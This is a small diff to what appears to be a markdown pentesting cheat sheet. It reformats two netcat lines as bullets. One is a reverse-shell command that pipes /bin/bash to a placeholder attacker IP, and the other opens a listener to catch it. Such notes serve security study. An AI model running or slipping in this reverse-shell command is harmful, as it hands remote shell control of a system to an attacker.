@@ -44,9 +44,9 @@ nmap <ip-address>
 
 ### netcat
 
-`nc <attacker-ip> <port-number> -c /bin/bash`
+* `nc <attacker-ip> <port-number> -c /bin/bash`
 
-`nc -nvlp <port-number>`
+* `nc -nvlp <port-number>`
 
 ### privilege escalation vs exploitation
 
